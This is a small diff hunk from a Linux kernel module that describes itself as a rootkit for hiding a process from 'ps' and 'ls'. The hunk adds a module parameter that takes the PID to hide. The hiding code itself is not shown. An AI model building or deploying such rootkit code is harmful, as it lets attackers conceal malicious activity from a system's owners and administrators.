@@ -11,6 +11,8 @@ MODULE_AUTHOR("Tal");
 MODULE_DESCRIPTION("A Rootkit for hiding a process from 'ps' && 'ls' commands");
 MODULE_VERSION("0.0.1");
 
+module_param(hide_pid, charp, S_IRUGO); 
+MODULE_PARM_DESC(hide_pid, "pass the PID");
 
 static int __init entry_rootkit(void){
     buffer_path_pid();
